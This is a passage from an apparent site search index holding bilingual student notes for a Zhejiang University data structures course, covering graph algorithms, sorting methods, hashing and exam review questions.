<p>a[0][1] is 1 which expresses there is an edge between 0 and 1</p> <p>\u5982\u679c\u662f\u65e0\u5411\u56fe\u7684\u8bdd \u53ea\u9700\u8981\u5b58\u4e0b\u4e09\u89d2\u5c31\u884c \u56e0\u4e3a\u662f\u8f74\u5bf9\u79f0\u7684</p> <p>degree \u5982\u679c\u662f\u6709\u5411\u56fe\u7684\u8bdd\u8981\u52a0\u4e24\u904d\u77e9\u9635\u518d/2</p> <p>the adjacency lists</p> <p>\u6bcf\u4e2a\u8282\u70b9\u90fd\u8bbe\u8ba1\u4e00\u4e2a\u94fe\u8868\uff0c\u628a\u5176\u8fb9\u90fd\u8868\u793a\u51fa\u6765</p> <p>\u5bf9\u4e8e\u6709\u5411\u56fe \u6bcf\u4e2a\u8282\u70b9\u8bbe\u8ba1\u4e24\u4e2a\u94fe\u8868\uff0c\u4e00\u4e2a\u8868\u793a\u51fa\u7684\u8fb9\uff0c\u4e00\u4e2a\u8868\u793a\u5165\u7684\u8fb9 \u4e5f\u53ef\u4ee5\u901a\u8fc7multilist</p> <p>\u8bbe\u8ba1\u8fb9\u7684\u7ed3\u6784\uff0c\u5e76\u4e14\u5c06\u5176\u8fde\u8d77\u6765</p>"},{"location":"ZJU-course/fds/FDS/#algorithms","title":"algorithms","text":""},{"location":"ZJU-course/fds/FDS/#topological-sort","title":"topological sort","text":"<p>\u4f8b\u5b50 \u4fee\u8bfe\u987a\u5e8f</p> <p>i is a predecessor of j, which means there a path from i to j.</p> <p>i is a precedes of j, which means there is  <p>partial order, it is transitive and irreflexive(there is no i-&gt;i or circle)</p> <p>topological order is not single.</p> <p>We just need to find one in this algorithms</p> <p>This graph must be a DAG</p> <p>solution</p> <p>Always find the vertices which in-degree is 0. (If there is no such vertices, it must be circle in this graph)</p> <pre><code>V=FindNewVertexOfDegreeZero();\n</code></pre> <p>We loop at first and find all of VertexOfDegreeZero then we add the VertexOfDegreeZero to the set during the algorithms </p> <p>O(V+E)</p>"},{"location":"ZJU-course/fds/FDS/#shortest-path-problem","title":"shortest path problem","text":"<p>This problem is no solution in the there is a loop in negative number</p> <p>unweighted shortest problem</p> <p>\u6bcf\u6761\u8def\u7684\u6743\u91cd\u76f8\u540c</p> <p>\u4ece\u8d77\u70b9\u5f00\u59cb\uff0c\u627e\u4e00\u6b65\u80fd\u5230\u7684\uff1b\u518d\u4ece\u4e00\u6b65\u80fd\u5230\u7684\u70b9\u4e3a\u8d77\u70b9\uff0c\u627e\u4e00\u6b65\u80fd\u5230\u7684\uff0c\u5982\u6b64\u5faa\u73af</p> <p>It is also called breadth-first search</p> <p>\u53ef\u4ee5\u7528\u961f\u5217\u8bbe\u8ba1</p> <p>dijkstra's algorithms</p> <p>\u5bf9\u4e8e\u5e26\u6743\u91cd\u7684\u6709\u5411\u56fe\uff0c\u8be5\u7b97\u6cd5\u6307\u9488\u5bf9\u975e\u8d1f\u6743\u91cd\u7684\u56fe</p> <p>\u5206\u4e3a\u4e09\u4e2a\u96c6\u5408\uff0c\u4e00\u4e2a\u96c6\u5408\u662f\u5df2\u7ecf\u627e\u5230\u6700\u77ed\u8def\u5f84\u7684\u70b9\uff0c\u4e00\u4e2a\u96c6\u5408\u662f\u901a\u8fc7\u4e0a\u4e00\u4e2a\u96c6\u5408\u76f4\u63a5\u8d70\u5230\u7684\u70b9\uff0c\u6700\u540e\u4e00\u4e2a\u662f\u65e0\u6cd5\u901a\u8fc7\u7b2c\u4e00\u4e2a\u96c6\u5408\u76f4\u63a5\u8d70\u5230\u7684\u70b9  </p> <p>\u6709\u7740\u4e09\u4e2a\u96c6\u5408\u4e4b\u540e\uff0c\u8ba1\u7b97\u7b2c\u4e00\u96c6\u5408\u5230\u7b2c\u4e8c\u96c6\u5408\u7684\u70b9\u7684\u5404\u6761\u8def\u5f84\u7684\u957f\u5ea6\uff0c\u5176\u4e2d\u6700\u77ed\u7684\u90a3\u6761\u5fc5\u7136\u662f\u5176\u5bf9\u5e94\u7684\u70b9\u7684\u6700\u77ed\u8def\u5f84\uff08\u56e0\u4e3a\u5176\u4ed6\u5fc5\u987b\u7ecf\u8fc7\u66f4\u957f\u8def\u5f84\uff09\u5c06\u5176\u52a0\u5165\u7b2c\u4e00\u96c6\u5408</p> <p>negative edges graph</p> <p>\u5bf9\u4e8e\u5b58\u5728\u8d1f\u8fb9\u7684\u56fe\uff0cdijkstra\u7b97\u6cd5\u5c31\u4e0d\u9002\u7528\u4e86\uff0c</p> <pre><code>Q=createque;\nwhile(!Q.empty()){\n    V=deque(Q);\n    for(each W adajcent to V){\n        if(T[V].dist+CV&lt;T[W].dist){\n            \u8fdb\u884c\u5904\u7406\n        }\n    }\n}\n\u53ea\u8981\u4e0d\u5b58\u5728\u8d1f\u73af\uff0c\u7a0b\u5e8f\u5c31\u80fd\u7ec8\u6b62\n</code></pre> <p>acyclic graph</p> <p>T=O(E+V)</p> <p>\u53ef\u4ee5\u8ba1\u7b97\u6700\u5c0f\u7684\u8def\u5f84\uff0c\u5e76\u4e14\u9700\u8981\u5b8c\u5168\u524d\u5e8f\u6240\u6709\u5185\u5bb9</p> <p>\u53ef\u4ee5\u5355\u7eaf\u8ba1\u7b97\u6700\u5c0f\u8def\u5f84</p> <p>All-pairs shortest path problem</p>"},{"location":"ZJU-course/fds/FDS/#network-flow-problems","title":"network flow problems","text":"<p>\u8fb9\u7684\u8bbe\u8ba1\u5728\u4e8e\u4e00\u4e2a\u70b9\u7684\u51fa\u91cf\u548c\u8fdb\u91cf</p> <p>\u627e\u4efb\u610f\u8def\u5f84\uff08\u6700\u597d\u662f\u6700\u5927\u5bb9\u91cf\u8def\u5f84\uff0c\u5220\u8fb9\uff08\u51cf\u53bb\u8fd9\u6761\u8def\u5f84\u4e0a\u7684\u6700\u5c0f\u503c\uff0c\u6216\u8005\u662f\u53cd\u5411\u52a0\u8fb9\uff09</p> <p>\u5176\u7ec8\u6b62\u6761\u4ef6\u662f\u8fb9\u957f\u4e3arational number \u6709\u7406\u6570</p>"},{"location":"ZJU-course/fds/FDS/#minimum-spanning-tree","title":"minimum spanning tree","text":"<p>the spanning tree is a tree which consists of V(G) and the subset of E(G)</p> <p>\u53ea\u6709\u8fde\u901a\u56fe\u624d\u6709\u751f\u6210\u6811\uff0c\u5e76\u4e14\u8fde\u901a\u56fe\u4e00\u5b9a\u6709\u751f\u6210\u6811</p> <p>what is minimum \u8be5\u751f\u6210\u6811\u7684\u8fb9\u6743\u91cd\u4e4b\u548c\u6700\u5c0f\uff08\u8fb9\u7684\u6570\u76ee\u5fc5\u4e3aV(G)-1</p> <ul> <li>\u4f7f\u7528\u56fe\u4e2d\u8fb9</li> <li>\u4e0d\u91cd\u590d\u627e\u70b9</li> <li>\u4e0d\u5f62\u6210\u73af</li> <li>\u627e\u5c0f\u6743\u91cd\u7684\u8fb9</li> </ul> <p>kruskal-----maintain a forest  ElogE</p> <ul> <li>\u4e0d\u65ad\u5730\u627e\u6700\u77ed\u8fb9  \u5c0f\u6839\u5806</li> <li>\u5982\u679c\u4e24\u4e2a\u70b9\u5df2\u7ecf\u5728\u540c\u4e00\u9897\u6811\u91cc\u4e86\u5c31\u8df3\u8fc7  \u5e76\u67e5\u96c6</li> </ul>"},{"location":"ZJU-course/fds/FDS/#depth-first-search","title":"depth first search","text":"<p>like the preorder the search, \u4f46\u662f\u9700\u8981\u52a0\u4e0a\u4e00\u4e2avisited\u5224\u65ad\u9632\u6b62\u91cd\u590d\u5224\u65ad\uff08\u6811\u91cc\u9762\u4e4b\u6240\u4ee5\u6ca1\u6709\u56e0\u4e3a\u6811\u7684\u65b9\u5411\u662f\u4e00\u81f4\u7684\uff0c\u4ece\u7236\u4eb2\u5230\u5b69\u5b50</p> <p>\u5bf9\u4e8e\u8054\u901a\u56fe\uff0c\u53ef\u4ee5\u7528DFS\u904d\u5386\uff0c\u5982\u679c\u9700\u8981\u5904\u7406\u975e\u8fde\u901a\u56fe</p> <pre><code>void DFS_all(Graph g){\n    for(each v in g){\n        if(!visited[v}){\n            DFS(v);\n        }\n    }\n}\n</code></pre> <p>biconnectivity</p> <p>articulation point\u5173\u8282\u70b9 \u9664\u53bb\u8fd9\u4e2a\u70b9\u540e\u4f1a\u9020\u6210\u81f3\u5c11\u4e24\u4e2a\u8fde\u901a\u56fe</p> <p>graph is biconnected graph if there is no articulation point in this graph(this graph should be connected at first</p> <p>biconnected -&gt; \u62ff\u6389\u4e00\u4e2a\u9876\u70b9\u8fd8\u662f\u8054\u901a\u7684 \uff08\u81f3\u5c11\u6709\u4e24\u4e2a\u8282\u70b9\uff09</p> <p>k-connected -&gt; \u62ff\u6389k-1\u4e2a\u9876\u70b9\u8fd8\u662f\u8054\u901a\u7684</p> <p>a biconnected component is a maximal biconnected subgraph\uff08\u76f8\u5bf9\u4e8e\u81ea\u5df1\u6765\u8bf4\u6700\u5927</p> <p>\u4e00\u4e2a\u56fe\u62c6\u5206\u51fa\u7684component\u4e4b\u95f4\u4e0d\u4f1a\u6709\u91cd\u5408\u7684\u8fb9</p> <p>how to find the biconnected components of a connected undirected G</p> <ol> <li>use the DFS to obtain the spanning tree</li> <li>we will have a tree and a back edges(\u9664\u4e86\u751f\u6210\u6811\u7684\u8fb9\u4ee5\u5916\u7684\u8fb9\uff0c\u5fc5\u7136\u4f1a\u94fe\u63a5\u7956\u5148\u540e\u4ee3\uff0c\u4e0d\u4f1a\u662f\u540c\u6df1\u5ea6)</li> <li>\u5bf9\u4e8e\u8fd9\u68f5\u6811\u548cback edges \u5bf9\u4e8eroot \u5982\u679c\u6709\u4e24\u4e2a\u4ee5\u4e0a\u5b69\u5b50\uff0c\u4e00\u5b9a\u662f\u5173\u8282\u70b9\uff1b\u5bf9\u4e8e\u53f6\u8282\u70b9\u4e0d\u53ef\u80fd\u662f\u5173\u8282\u70b9\uff1b\u5bf9\u4e8e\u5176\u4ed6\u8282\u70b9\u800c\u8a00\uff0c\u5411\u4e0b\u8d70\u80fd\u901a\u8fc7back edges \u8d70\u5230\u5176\u7956\u5148\uff08\u81ea\u5df1\u4e0d\u7b97\uff09\uff0c\u90a3\u4e48\u5c31\u4e0d\u662f\u5173\u8282\u70b9</li> </ol> <p>Low(number)= min(num(number), min(low(child)), min(num(back)))</p> <p>\u7b97\u51falow number\uff0c\u6761\u4ef6\u5316\u4e3a</p> <ol> <li>u is a root and has at least 2 children</li> <li>u is not the root and has at least 1 child and Low(child)&gt;=num(u)</li> </ol> <p>\u200d</p>"},{"location":"ZJU-course/fds/FDS/#_2","title":"\u6b27\u62c9\u56de\u8def","text":"<ol> <li>the graph has euler circuit is possible only if all vertex has a even degree</li> <li>the graph has the euler tour is possible only if all vertex has a even degrees and there are two vertices have odd degree</li> </ol> <p>implementation</p> <ol> <li>DFS,\u4e0d\u65ad\u627e\u73af\uff0c\u7136\u540e\u62fc\u8d77\u6765</li> </ol> <p>hamilton cycle \u7684\u5b9a\u4e49</p>"},{"location":"ZJU-course/fds/FDS/#sort","title":"sort","text":"<pre><code>void X_sort( A[], int N)\n</code></pre>"},{"location":"ZJU-course/fds/FDS/#insertion-sort","title":"insertion sort","text":"<p>the lower bound for simple sorting algorithms</p> <p>\u505a\u6392\u5e8f\u7684\u672c\u8d28\u662f\u6d88\u9664\u9006\u5e8f\uff0c\u4e00\u6b21\u76f8\u90bb\u4ea4\u6362\u6700\u591a\u5220\u9664\u4e00\u4e2a\u9006\u5e8f\uff0c\u5e73\u5747\u800c\u8a00\u4e00\u4e2a\u6570\u7ec4\u4f1a\u6709n(n-1)/4 \u4e2a\u9006\u5e8finversions</p>"},{"location":"ZJU-course/fds/FDS/#shell-sort","title":"shell sort","text":"<p>For example</p> <ul> <li>make 5-sort \u95f4\u96944\u4e2a\u5143\u7d20\uff0c\u505a\u4e00\u4e2a\u63d2\u5165\u6392\u5e8f\uff08\u8fd8\u662f\u5728\u539f\u6765\u7684\u90a3\u51e0\u4e2a\u4f4d\u7f6e\u4e0a\uff0c\u4f8b\u59821 6 11\uff0c\u4e5f\u53ea\u4ea4\u6362\u8fd9\u4e09\u4f4d\u5143\u7d20\uff09\uff0c\u505a\u591a\u6b21\u76f4\u5230\u6bcf\u4e2a\u5143\u7d20\u90fd\u88ab\u8ba1\u7b97\u5230</li> <li>make 3-sort \u540c\u7406</li> <li>the end make 1-sort \u5bf9\u6574\u4e2a\u6570\u7ec4\u505a\u63d2\u5165\u6392\u5e8f</li> </ul> <p>\u524d\u7f6e\u76845-sort and 3-sort\u5df2\u7ecf\u6d88\u9664\u4e86\u5927\u90e8\u5206\u7684\u9006\u5e8f\u5bf9\uff0c\u5bfc\u81f4\u4e86\u63d2\u5165\u6392\u5e8f\u7684\u6548\u7387\u63d0\u9ad8</p> <p>define an increment sequence</p> <ul> <li>questions: \u524d\u7f6e\u7684\u5904\u7406\u662f\u5426\u4f1a\u4f7f\u5f97\u9006\u5e8f\u5bf9\u589e\u52a0\uff1f\u9996\u5148\uff0c\u6211\u4eec\u53ea\u4f1a\u4ea4\u6362\u9006\u5e8f\u6570\uff0c\u5206\u4e09\u79cd\u60c5\u51b5   \u4e24\u4ea4\u6362\u6570\u5185\u90e8\u6570\u5b57\uff0c\u5728a\u548cb\u4e2d\u95f4\uff0c\u6709\u6536\u76ca   \u4e24\u4ea4\u6362\u6570\u5916\u90e8\u6570\u5b57\uff0c(&gt;a || &lt;b)\uff0c\u9006\u5e8f\u6570+1 -1 \u5bf9\u4e8e\u8be5\u6570\u800c\u8a00\u81f3\u5c11\u6ca1\u6709\u8d1f\u53d7\u76ca</li> </ul> <p>tips: hk-1-sort \u4e0d\u4f1a\u7834\u574f hk-sort\uff0c\u6570\u6216\u8bb8\u6539\u53d8\u4e86\uff0c\u4f46\u662f\u987a\u5e8f\u7684\u6b63\u786e\u6027\u672a\u6539\u53d8</p> <p>how to define the incremnet sequence</p> <p>\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\u6211\u4eec\u6bd4\u8f83\u968f\u610f\u5730\u9009\u62e9\u4e86 1 3 5 \u7684\u6392\u5e8f\u65b9\u5f0f</p> <p>\u4f46\u5b9e\u9645\u4e0a\u6211\u4eec\u4e00\u822c\u4f1a\u9009\u62e9  ht = \u5411\u4e0b\u53d6\u6574(N/2)  hk = \u5411\u4e0b\u53d6\u6574(hk+1 / 2\uff09\uff08shell's increments)</p> <pre><code>for(increment = N/2 ; increment &gt; 0 ; increment /= 2){\n    for(int i= increment ; i&lt;N ; i++) //\u63d2\u5165\u6392\u5e8f\n</code></pre> <p>\u65f6\u95f4\u590d\u6742\u5ea6\u5206\u6790</p> <p>the worst case is O(N^2) follow shell's increments (\u6bcf\u4e2a\u5b50\u5e8f\u5217\u90fd\u662f\u6392\u597d\u5e8f\u7684\uff0c\u4f46\u672c\u8eab\u662f\u4e71\u5e8f\uff0c\u9000\u5316\u6210\u63d2\u5165\u6392\u5e8f</p> <p>increment seqence is important for the efficiency in the shell sort, it will be better the sequence is all relatively prime\uff08\u4e92\u8d28\uff09</p> <ul> <li>if hk = 2^k - 1  ^the worst case become O(N^3/2)</li> <li>if hk = 9x4^i^ - 9 x 2^i^ +1 the worst case become O(N^5/4)</li> </ul> <p>\u6392\u5e8f\u7b97\u6cd5\u7684\u5206\u6790</p> <ul> <li>in-place  \u4e0d\u9700\u8981\u989d\u5916\u5f00\u7f13\u5b58\uff08\u81f3\u5c11\u9700\u8981\u91cd\u65b0\u5f00\u4e00\u4e2a\u5730\u65b9\u5b58\u6570\u7ec4   shell\u548c\u63d2\u5165\u90fd\u662f</li> <li>stable      \u4e0d\u6539\u53d8\u76f8\u540c\u91cf\u7684\u6570\u636e\u7684\u539f\u5148\u987a\u5e8f(\u4f8b\u5982\u7ed9\u5b66\u751f\u5e74\u9f84\u6392\u540d\uff0ca\u548cb\u540c\u9f84\uff0c\u672c\u6765a\u5728b\u524d\uff0c\u6392\u5e8f\u540ea\u4e5f\u5728b\u524d)\uff0c\u63d2\u5165\u6392\u5e8f\u662fstable\uff0cshell\u6392\u5e8f\u4e0d\u662f</li> </ul>"},{"location":"ZJU-course/fds/FDS/#heap-sort","title":"heap sort","text":"<p>\u9009\u62e9\u6392\u5e8f\u7684\u4f18\u5316\uff0c\u9009\u62e9\u6392\u5e8f\u9700\u8981\u6bcf\u6b21\u904d\u5386\u6765\u627e\u51fa\u6700\u5c0f\u7684\u503c\uff0c\u653e\u5728\u9996\u4f4d\u3002heap\u53ef\u4ee5\u52a0\u5feb\u627e\u6700\u5c0f\u503c\u7684\u8fc7\u7a0b</p> <pre><code>heap_sort{\n    build_heap(H);\n    for(int i=0;i&lt;N;i++)\n            tmpH[i]=deleteMin(H);\n    for(int i=0;i&lt;N;i++){\n            H[i]=tmpH[i];\n}\n</code></pre> <p>O(N*logN)</p> <p>\u4f46\u662f\u5176\u4e2d\u4f7f\u7528\u4e86tmpH\u6570\u7ec4\uff0c\u4f7f\u5176\u4e0d\u662fin-place\uff0c\u53ef\u4ee5\u8fdb\u884c\u4f18\u5316\uff0c\u628adeletemin\u7684\u5220\u9664\u5143\u7d20\u518d\u653e\u56de\u5806\u7684\u6700\u540e\uff0c\u4f46\u8fd9\u6837\u6700\u597d\u4ece\u5c0f\u5230\u5927\u6392\u65f6\uff0c\u4f7f\u7528\u5927\u6839\u5806</p> <pre><code>void heapsort(A[],int N){\n    for(int i=(N-1)/2 ; i&gt;=0 ; i--){\n        pecDown(A, i, N);\n    }\n    for(int i=N-1; i&gt;0; i--){\n        swap(&amp;A[0],&amp;A[i]);\n        percDown(A,0,i);\n    }\n}\n</code></pre> <p>\u6784\u5efa\u5806\uff08\u5e38\u8003\uff0c\u6ce8\u610f\u5728heapsort\u91cc\u6ca1\u6709\u54e8\u5175\uff0c0\u4f4d\u662f\u8981\u7528\u7684\uff0c\u5de6\u5b69\u5b50\u53d8\u62102i+1 \u53f3\u5b69\u5b50\u662f2i+2</p> <p>in-place but not stable</p> <p>\u989d\u5916\u7a7a\u95f4\u662fO1</p>"},{"location":"ZJU-course/fds/FDS/#merge-sort","title":"merge sort","text":"<p>merge two sorted list</p> <p>\u65b0\u5f00\u4e00\u4e2a\u6570\u7ec4\uff0c\u5f00\u59cb\u6bd4\u8f83\u4e24\u8fb9\u7684\u6700\u5c0f\u6570\uff0c\u653e\u8fdb\u65b0\u7684\u6570\u7ec4 O(N)</p> <pre><code>void Msort(A[],temp[],left,right){\n    if(left &lt; right){\n        center=(left + right) / 2;\n        Msort(A,temp,left,center);\n        Msort(A,temp,center+1,right);\n        merge(A,temp,left,center+1,right);  //merge \u4f1acopy temp\u7684\u7ed3\u679c\u5230A\u6570\u7ec4\n    }\n}\n//\u4e0a\u9762\u7684\u7b97\u6cd5\u662f\u6838\u5fc3\uff0c\u4e0b\u9762\u662f\u7ed9\u7528\u6237\u7684\u63a5\u53e3\nvoid mergeSort(A[],int N){\n        new a temp;\n        if(temp!=NULL){\n            Msort(A,temp,0,N-1);\n            free temp;\n        }\n}\n</code></pre> <p>O(N+NlogN)  \u89c1PPT\u63a8\u5bfc  \u6bcf\u5c42N \u4e00\u5171logN\u5c42</p> <p>tips \u94fe\u8868\u5f62\u5f0f\u7684merge sort\uff0c\u4f8b\u5982heapsort\u7b49\u9700\u8981\u968f\u673a\u8bbf\u95ee\u7684\uff0c\u5c31\u4e0d\u80fd\u4f7f\u7528linked list</p>"},{"location":"ZJU-course/fds/FDS/#quick-sort","title":"quick sort","text":"<p>fastest known in practice.</p> <p>\u505apartion, \u9009\u62e9\u4e00\u4e2a\u5143\u7d20\uff0c\u628a\u6bd4\u4ed6\u5c0f\u7684\u653e\u4e00\u5757\uff0c\u6bd4\u4ed6\u5927\u7684\u653e\u53e6\u4e00\u5757\uff0c\u518d\u5bf9\u8fd9\u4e24\u5757\u90fd\u9012\u5f52</p> <ol> <li>\u5143\u7d20\u600e\u4e48\u9009</li> <li>partion\u5982\u4f55\u5b9e\u73b0</li> </ol> <p>\u9009\u62e9\u5143\u7d20  \u968f\u673a\uff0cmedian(left, center, right)</p> <p>partion \u4e0d\u5f00\u7f13\u5b58\uff0c\u5148\u628a\u9009\u62e9\u5143\u7d20\u7ed9\u653e\u5230\u6700\u540e\u4e00\u4e2a\u5143\u7d20int i = 0; int j = length-2;</p> <p>\u5982\u679c\u6709\u91cd\u590d\u6570\u636e\u4e0e\u9009\u62e9\u7684\u6570\u636e\u76f8\u540c\u600e\u4e48\u529e</p> <p>\u6df7\u5408\u7b56\u7565\u91c7\u7528sort\uff0cquick sort\u5728\u8f83\u5c0f\u7684\u65f6\u5019\u4f1a\u6bd4insertion\u6162\uff0c\u6240\u4ee5\u4f1a\u91c7\u7528\u9012\u5f52\uff0c\u5728\u8f83\u5c0f\u65f6\u4f7f\u7528insertion</p> <p>\u65f6\u95f4\u5206\u6790</p> <p>T(N) = T(i) + T(N-i-1) + cN</p> <p>worst case T(N) = T(N-1) + cN;  o(N^2)</p> <p>best case T(N) = 2T(N / 2) + cN; o(N logN)</p> <p>average case o(NlogN)s</p> <p>\u9009\u62e9\u7b2ck\u5927\u5143\u7d20 -&gt; \u770b\u56de\u653e</p>"},{"location":"ZJU-course/fds/FDS/#sorting-large-stuctures","title":"sorting large stuctures","text":"<p>\u4ea4\u6362\u5176\u5728\u5185\u5b58\u4e0a\u7684\u5360\u7528\u5f88\u9ebb\u70e6</p> <p>\u8ba9\u5176\u6570\u7ec4\u53d8\u6210\u4e00\u4e2a\u7c7bhash\u7d22\u5f15\u6570\u7ec4\uff0c\u6539\u53d8\u7d22\u5f15\u6570\u7ec4</p> <p>list[table[i]]</p> <p>\u6bcf\u4e2amove\u4f1a\u79fb\u52a8\u591a\u6b21</p>"},{"location":"ZJU-course/fds/FDS/#gengeral-lower-bound-for-sorting","title":"gengeral lower bound for sorting","text":"<p>\u57fa\u4e8e\u6bd4\u8f83\u7684\u7b97\u6cd5\uff0c\u6700\u574f\u60c5\u51b5\u7684\u4e0b\u754c\u662fNlogN</p> <p>\u51b3\u7b56\u6811\u6709N!\u4e2a\u53f6\u8282\u70b9\uff0c\u9ad8\u5ea6\u662fNlogN</p>"},{"location":"ZJU-course/fds/FDS/#bucket-sort-and-radix-sort","title":"bucket sort and radix sort","text":"<p>bucket sort</p> <p>\u4f8b\u598210000\u4e2a\u5b66\u751f\u7684\u5206\u6570\uff0c\u5206\u6570\u4e3a0\u5230100\uff0c\u90a3\u4e48\u6211\u4eec\u6709101\u4e2abucket\uff0c\u5c0610000\u4e2a\u6570\u636e\u63d2\u5165bucket\uff0c\u63d2\u5165\u662f\u4e2a\u5e38\u6570\u65f6\u95f4\uff0c\u6240\u4ee5\u4e3aO(N)</p> <p>radix sort</p> <p>\u4f8b\u5982\u7ed910\u4e2a\u6570\uff0c\u8303\u56f4\u662f0\u52301000\uff0c\u6839\u636e\u4f4d\u6570\u8fdb\u884c\u6876\u6392\u5e8f</p>"},{"location":"ZJU-course/fds/FDS/#hash","title":"hash","text":"<p>simple table, a set of name-attribute pairs, where the names are unique</p> <p>have m buckets, and each buckets has some slots</p> <p>hash function should be easy to calculate and the result should be discrete</p> <p>\u53ea\u7528\u6570\u7ec4\u5b8c\u6210\u4e00\u4e2ahash table</p> <p>\u7ed9hash function \u51c6\u5907\u4e00\u4e2a\u589e\u91cf\u5e8f\u5217 f(i)</p> <p>\u4f8b\u5982f(i) = i  \u5f53\u5176\u53d1\u751fcollision\u65f6\uff0c\u76f4\u63a5\u53bb\u7528f(i)\u627e\u5176\u4ed6\u7a7a\u4f4d</p> <p>**quadratic probing  **</p> <p>f(i) = i^2   \u4e0d\u4e00\u5b9a\u80fd\u5145\u5206\u5229\u7528hash\u8868\u7684\u7a7a\u95f4</p> <p>table size \u662f\u8d28\u6570\uff0c\u4e00\u534a\u662f\u7a7a\u7684\uff0c\u4e00\u5b9a\u80fd\u63d2\u5165</p> <p>table size \u662f\u8d28\u6570\uff0c\u5e76\u4e14\u4e3a4*i+3\u7684\u5f62\u5f0f\uff0cf(i) = \u6b63\u8d1fi^2 \u4e00\u5b9a\u80fd\u63a2\u6d4b\u6240\u6709\u4f4d\u7f6e</p> <p>lazy delete</p> <p>double hashing</p> <p>f(i) = i * hash2(x)</p> <p>hash2 = R - (x%R)</p> <ul> <li>hash2(X) !=0 \u4e0d\u6052\u7b49\u4e8e0</li> <li>\u5927\u591a\u6570\u533a\u57df\u8981\u80fd\u88ab\u63a2\u6d4b\u5230</li> </ul> <p>rehashing</p> <ul> <li>\u91cd\u5efa\u4e00\u4e2a\u65b0\u8868\uff0csize\u6269\u5927\u4e24\u500d\u5de6\u53f3\uff0c\u4fdd\u6301\u7d20\u6570size</li> <li>\u91cd\u65b0\u63d2\u5165\u6240\u6709\u5143\u7d20</li> <li>\u7528\u65b0\u7684hash function</li> </ul> <p>T(N) = O(N)  \u6709N\u4e2a\u5143\u7d20\u9700\u8981\u63d2\u5165</p> <p>rehash\u7684\u9009\u62e9\uff0c\u5728\u4ec0\u4e48\u60c5\u51b5\u4e0b\u9009\u62e9rehash</p> <ul> <li>\u534a\u7a7a</li> <li>\u51b2\u7a81\u65f6</li> <li>\u8bbe\u5b9a\u4e00\u4e2a\u4e0a\u9650</li> </ul>"},{"location":"ZJU-course/fds/FDS/#_3","title":"\u671f\u4e2d\u4e60\u9898\u6574\u7406","text":"<ol> <li>the major task of algorithms analysis is time complexity and space complexity</li> <li>\u8bb0\u5f97\u786e\u8ba4\u5faa\u73af\u7684\u771f\u6b63\u5b9e\u73b0\u6b21\u6570</li> <li>fibonacci number sequence's time complexity and space complexity     the space complexity is O(N)     the time complexity is O(N^2)</li> <li>consecutive</li> <li>to merge two singly linked ascending list both N node into one linked ascending list, the minimum possible number of comparsions is N</li> <li>enqueue \u5165\u961f\u5217  dequeue \u51fa\u961f\u5217 1-&gt;2-&gt;3 enqueued 4     1-&gt;2-&gt;3-&gt;4</li> <li>HW4</li> <li>In a binary search tree which contains several integer keys including 4, 5, and 6, if 4 and 6 are on the same level, then 5 must be their parent.      F</li> <li>HW5 2-3 2-5</li> <li>delete the tree  2\u4e2a\u8282\u70b9 \u5c31\u627e\u5230\u53f3\u8fb9\u6700\u5c0f\u7684</li> </ol>"},{"location":"ZJU-course/fds/FDS/#_4","title":"\u671f\u672b\u4e60\u9898\u6574\u7406","text":"<ul> <li>\u53f6\u5b50\u8282\u70b9\u4e0d\u6b62\u6700\u540e\u4e00\u5c42\uff01</li> <li>If the inorder and the postorder traversal sequences of a binary tree have exactly the same order, then none of the nodes in the tree has a right subtree.   T</li> <li>The minimum spanning tree of a connected weighted graph with vertex set V={ A, B, C, D, E } and weight set W={ 1, 3, 2, 5, 1, 7, 9, 8, 4} must be unique.   T</li> <li>The sum of the degrees of all the vertices in a connected graph must be an even number.  T</li> <li>Given an undirected graph, and the edge set of a DFS from V0 as: {(V0,V1) , (V0,V4) , (V1,V2) , (V1,V3) , (V4,V5) , (V5,V6)} . Which one the following cannot be the sequence of another DFS?</li> </ul> <p>(3\u5206)</p> <p>[ ] A.</p> <p>V0, V4, V5, V6, V1, V2, V3</p> <p>[ ] B.</p> <p>V0, V2, V1, V3, V4, V5, V6</p> <p>[ ] C.</p> <p>V0, V6, V4, V5, V1, V2, V3</p> <p>[X] D.</p> <p>V0, V1, V5, V4, V6, V2, V3 * symmetric \u5bf9\u79f0\u6027</p> <p>reflexive \u81ea\u53cd\u6027</p> <p>transitive \u4f20\u9012\u6027 * If the hash values of n keys are all the same, and linear probing is used to resolve collisions, then the minimum total number of probings must be __ to insert these n keys .</p> <p>(3\u5206)</p> <p>[ ] A.</p> <p>n(n\u22121) / 2</p> <p>[ ] B.</p> <p>2n + 1</p> <p>[ ] C.</p> <p>2(n+1)</p> <p>[X] D.</p> <p>n(n+1) / 2   \u521d\u59cb\u4e5f\u7b97\u4e00\u6b21probe * \u5355\u4e2a\u9876\u70b9\u662f\u4e00\u4e2a\u8054\u901a\u5206\u91cf  \u6700\u591a\u7684\u8054\u901a\u5206\u91cf\u2014\u2014\u6240\u6709\u8fb9\u90fd\u5728\u4e00\u4e2a\u5b8c\u5168\u56fe\u91cc\u9762     \u6700\u5c11\u7684\u8054\u901a\u5206\u91cf\u2014\u2014\u6240\u6709\u8fb9\u5c55\u5f00 * During finding all articulation points in a connected graph, if v1 is the parent of v2 in the depth-first tree, Num(v1) must be less than Num(v2).     T * \u5728\u627e\u8054\u901a\u5206\u91cf\u548c\u5272\u70b9\u7684\u7b97\u6cd5\u4e2d nun(u)\u662f\u8fd9\u4e2a\u70b9\u88abDFS\u627e\u5230\u7684\u987a\u5e8f\uff0c\u4ece0\u5f00\u59cb\u7f16\u53f7\uff0clow(u)\u662f\u8fd9\u4e2a\u70b9\u6240\u80fd\u8fbe\u5230\u7684\u6700\u4f4e\u70b9\u7f16\u53f7  \u6709\u4e00\u4e2achild \u5e76\u4e14low(child) &gt;= num(u) u\u662f\u5272\u65ad\u70b9\uff0c\u8fd8\u6709root\u662f\u7279\u6b8a\u7684 * \u200b\u200b * \u6ce8\u610f\u524d\u9762\u7684\u5fc5\u987b\u5168\u90e8\u5b8c\u6210 * ### 1. n0 = n2 + 1</p> <p>\u603b\u7ed3\u70b9\u6570 =n0 + n1 + n2 (\u5ea6\u4e3a0\u30011\u30012\u7684\u7ed3\u70b9\u6570\u4e4b\u548c)</p> <p>\u603b\u7ed3\u70b9\u6570 = n1 + 2n2 + 1 \uff08\u5ea6\u4e3a1\u30012\u7684\u7ed3\u70b9\u7684\u5206\u652f+\u6839\u8282\u70b9\uff09</p> <p>\u76f8\u51cf\u5f97\uff1an0 = n2 + 1   